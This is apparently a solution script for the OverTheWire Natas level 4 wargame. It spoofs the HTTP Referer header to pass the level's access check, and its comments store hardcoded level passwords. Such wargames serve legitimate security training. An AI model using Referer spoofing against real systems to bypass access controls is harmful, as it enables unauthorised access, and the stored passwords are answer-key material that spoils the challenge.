#!/usr/bin/python3

import requests
import re

user = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'
url = 'http://%s.natas.labs.overthewire.org' %user

headers = {"referer":"http://natas5.natas.labs.overthewire.org/"}


resp = requests.get(url,auth=(user,password), headers = headers)
content = resp.text

print(content)

# print(re.findall('password (.*)', content))

# g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
# h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
# G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
# natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
# natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD